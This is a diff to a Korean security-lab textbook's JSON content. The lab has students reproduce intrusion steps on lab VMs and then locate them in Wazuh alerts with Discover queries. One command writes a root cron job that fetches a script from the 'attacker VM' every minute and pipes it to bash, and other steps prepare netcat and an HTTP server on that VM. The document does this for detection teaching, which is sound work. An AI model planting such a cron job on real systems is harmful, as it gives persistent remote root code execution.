@@ -102,6 +102,10 @@
         {
           "type": "p",
           "text": "9.2~9.4에서는 이미 허용된 ccc 계정으로 접속한 상태에서 후속 변경을 재현한다. ccc는 이 실습 환경에서 sudo를 사용할 수 있다. 일반 계정을 관리자 권한으로 바꾸는 취약점 공격은 여기서 수행하지 않는다."
+        },
+        {
+          "type": "p",
+          "text": "**Discover**에서 wazuh-alerts-*를 선택하고 기존 필터 칩을 지운다. 각 파일 변경이나 명령 실행 직전에 시각을 적고, 그 시각부터 확인 시점까지를 **Absolute**로 지정한다. Q09 검색식 전체를 입력해 실행한 뒤 행을 펼쳐 **Table**·**JSON**을 읽는다. 변경·실행·원상복구 시각을 한 구간에 넣었다면 **Time**을 오름차순으로 정렬해 단계별로 나눈다."
         }
       ],
       "major": true,
@@ -268,7 +272,7 @@
       "blocks": [
         {
           "type": "p",
-          "text": "Windows 브라우저에서 Wazuh에 로그인한다. 데모 계정은 admin / SecretPassword이다. 메뉴에서 Explore의 **Discover**를 열고 wazuh-alerts-*를 선택한다. 시간 선택 버튼으로 실습 구간을 지정하고 **Refresh**를 누른다. 본문 화면은 한국 시간 07:45~08:05 범위이다. UTC로는 전날 22:45~23:05이다."
+          "text": "Windows 브라우저에서 Wazuh에 로그인한다. 데모 계정은 admin / SecretPassword이다. 메뉴에서 Explore의 **Discover**를 열고 wazuh-alerts-*를 선택한다. 시간 선택 버튼으로 실습 구간을 지정하고 **Refresh**를 누른다. 본문 화면은 한국 시간 2026년 11월 3일 07:45~08:05 범위이다. UTC로는 전날 22:45~23:05이다."
         },
         {
           "type": "p",
@@ -377,6 +381,14 @@
         {
           "type": "p",
           "text": "경보의 경로·시각·내용 차이를 보존하고 승인된 권한 변경인지 대조한다. /etc/passwd나 /etc/shadow가 함께 바뀌었다면 8장의 useradd·usermod·passwd 및 sudo 기록을 찾는다. 명령의 대상 계정과 변경 내용을 비교하고, 해당 로그가 없으면 다른 명령·감사 기록과 수집 상태를 조사한다."
+        },
+        {
+          "type": "query",
+          "id": "Q09-14",
+          "where": "Windows · Discover · wazuh-archives-*",
+          "text": "agent.name: \"bastion\"\nAND location: \"/var/log/auth.log\"\nAND predecoder.program_name: \"sudo\"\nAND full_log: *99-book09-lab*",
+          "why": "wazuh-archives-*로 바꾸고 권한 파일 변경 시각에서 sudo 원문을 찾는다.",
+          "result": "COMMAND의 tee·chmod·visudo·rm을 구분하고 요청 계정·PWD·TTY·시각을 기록한다. 파일 소유자와 명령 요청 계정을 따로 적는다. 이후 Q09-01·02는 wazuh-alerts-*로 되돌려 실행한다."
         },
         {
           "type": "command",
@@ -557,7 +569,7 @@
           "where": "Windows · Discover · wazuh-alerts-*",
           "text": "agent.name: \"bastion\" AND rule.groups: \"syscheck\" AND syscheck.path: \"/home/ccc/.ssh/authorized_keys\"",
           "why": "키 목록 변경 경보를 찾는다.",
-          "result": "키 추가와 원상복구의 modified 2건을 구분한다. 키를 사용한 로그인은 sshd의 인증 기록과 지문에서 확인한다."
+          "result": "키 등록 직후의 변경 경보를 확인한다. 기존 파일은 modified, 처음 만든 파일은 added부터 확인한다. 원상복구 뒤 같은 검색을 갱신해 복원 또는 삭제 기록을 별도로 읽는다. 사례의 전체 기간에는 기존 파일의 modified 두 건이 있다."
         },
         {
           "type": "query",
@@ -705,9 +717,9 @@
           "type": "command",
           "id": "C09-26",
           "where": "공격자 VM · att 셸",
-          "text": "command -v python3\nls -ld ~/book09/www\nmkdir ~/book09/www",
+          "text": "command -v python3\nls -ld ~/book09/www\nmkdir ~/book09/www\nls -l ~/book09/www/x.sh",
           "why": "python3는 파이썬 실행기이다. 실습용 하위 디렉터리가 없을 때만 mkdir를 실행한다.",
-          "result": "공격자 VM에 HTTP로 공개할 별도 www 디렉터리가 준비된다."
+          "result": "공격자 VM에 HTTP로 공개할 별도 www 디렉터리가 준비된다. x.sh가 이미 있으면 내용을 확인하고 덮어쓰기를 멈춘다."
         },
         {
           "type": "command",
@@ -755,9 +767,9 @@
           "type": "command",
           "id": "C09-31",
           "where": "kt66-bastion · SSH로 접속한 ccc 셸",
-          "text": "printf '%s\\n' \\\n'* * * * * root /usr/bin/curl -fsS --max-time 5 http://192.168.0.108:8000/x.sh | /bin/bash' \\\n| sudo tee /etc/cron.d/book09-lab\nsudo chmod 0644 /etc/cron.d/book09-lab\ncat /etc/cron.d/book09-lab",
+          "text": "printf '%s\\n' \\\n'* * * * * root /usr/bin/curl -fsS --max-time 5 http://192.168.0.108:8000/x.sh | /bin/bash' \\\n| sudo tee /etc/cron.d/book09-lab\nsudo chmod 0644 /etc/cron.d/book09-lab\ncat /etc/cron.d/book09-lab\nsudo stat -c \"%a %U %G %n\" /etc/cron.d/book09-lab",
           "result": "파일은 root 소유, 0644이며 cron 한 행이 기록된다. URL의 호스트는 공격자 VM의 192.168.0.108이다.",
-          "syntax": "printf의 작은따옴표는 별표와 파이프를 현재 셸이 해석하지 못하게 한다. 파일 안의 |는 예약 실행 때 curl 응답을 bash 입력으로 전달한다. 0644는 소유자 읽기·쓰기, 나머지 읽기이다. printf의 줄바꿈이 마지막 행을 완성한다.  작은따옴표 안의 예약식 전체는 한 줄이다. 지면에서 줄이 나뉘어 보이면 복사용 C09-31.txt와 대조한다.",
+          "syntax": "printf의 작은따옴표는 별표와 파이프를 현재 셸이 해석하지 못하게 한다. 파일 안의 |는 예약 실행 때 curl 응답을 bash 입력으로 전달한다. 0644는 소유자 읽기·쓰기, 나머지 읽기이다. printf의 줄바꿈이 마지막 행을 완성한다.  작은따옴표 안의 예약식 전체는 한 줄이다. 지면에서 줄이 나뉘어 보이면 복사용 C09-31.txt와 대조한다. stat의 %a·%U·%G·%n은 권한·소유자·그룹·경로이다.",
           "purpose": "실습용 스크립트를 매분 실행하는 예약 작업을 등록한다."
         },
         {
@@ -805,7 +817,7 @@
           "where": "Windows · Discover · wazuh-alerts-*",
           "text": "agent.name: \"bastion\" AND syscheck.path: \"/etc/cron.d/book09-lab\"",
           "why": "예약 파일의 생성과 제거를 찾는다.",
-          "result": "사례 조회 구간 added·554와 deleted·553의 2건이다."
+          "result": "cron 파일을 만든 직후 added·554를 먼저 확인한다. 9.4의 원상복구 뒤 조회 기간을 넓혀 deleted·553을 확인한다. 두 시점을 구분해 기록한다."
         },
         {
           "type": "command",
@@ -990,7 +1002,7 @@
           "id": "C09-40",
           "where": "공격자 VM · att 셸",
           "text": "command -v nc\nnc -h",
-          "result": "OpenBSD 계열과 필요한 옵션을 확인한다. 없으면 공식 Ubuntu의 netcat-openbsd 패키지를 준비한다.",
+          "result": "OpenBSD 계열과 필요한 옵션을 확인한다. 공격자 VM에 없으면 부록 A.15의 C01-24로 netcat-openbsd를 설치한 뒤 다시 확인한다.",
           "purpose": "공격자 VM에서 실행 파일과 도움말을 확인한다.",
           "syntax": "도움말은 표준 오류로 나올 수도 있다."
         },
@@ -1401,7 +1413,7 @@
           "where": "Windows · Discover · wazuh-alerts-*",
           "text": "agent.name: \"web\" AND rule.id: \"550\" AND syscheck.path: \"/usr/bin/yes\"",
           "why": "web의 yes 수정 경보를 찾는다.",
-          "result": "사례 조회 구간 2건. 07:53:20.516은 변조, 07:53:25.827은 원상복구이다."
+          "result": "변조 직후에는 크기·해시가 바뀐 550을 확인한다. 다음 절에서 원상복구한 뒤 같은 검색을 갱신해 초기 값으로 돌아온 변경을 확인한다. 사례 시각은 각각 07:53:20.516과 07:53:25.827 KST이다."
         },
         {
           "type": "image",
@@ -1526,6 +1538,14 @@
         {
           "type": "p",
           "text": "Wazuh에서 각 경로의 added 경보를 확인한 뒤 다음 동작을 한다. 기준 파일을 감시하기 전에 바로 생성·삭제하면 비교할 이력이 없어 결과가 달라질 수 있다. /home/ccc와 /var/log의 대상·제외 조건도 확인한다."
+        },
+        {
+          "type": "query",
+          "id": "Q09-13",
+          "where": "Windows · Discover · wazuh-alerts-*",
+          "text": "agent.name: \"bastion\"\nAND syscheck.event: \"added\"\nAND syscheck.path: (\"/var/log/book09-btmp\"\nOR \"/home/ccc/book09-history/.bash_history\")",
+          "why": "C09-62로 만든 두 실습 파일의 감시 시작을 확인한다.",
+          "result": "두 경로의 added를 각각 확인한 뒤 C09-63으로 진행한다. 한 경로라도 없으면 감시 경로·제외 설정·초기 검사·시간 범위를 확인한다."
         },
         {
           "type": "command",
